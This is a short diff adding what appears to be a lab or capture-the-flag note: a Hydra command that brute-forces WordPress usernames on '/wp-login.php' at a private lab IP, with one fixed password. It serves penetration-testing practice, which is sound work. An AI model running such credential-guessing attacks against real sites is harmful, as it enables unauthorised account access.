@@ -1,0 +1,6 @@
+Brute HTTP post form authentications usernames by dictionary with single
+password on URL "/wp-login.php". Sended data "log=^USER^&pwd=^PASSWORD^" and
+returned message not "Invalid username".
+
+
+hydra -L <USERNAMES_DICT> -p <PASSWORD> 10.10.47.108 http-post-form "/wp-login.php:log=^USER^&pwd=^PASSWORD^:Invalid username"
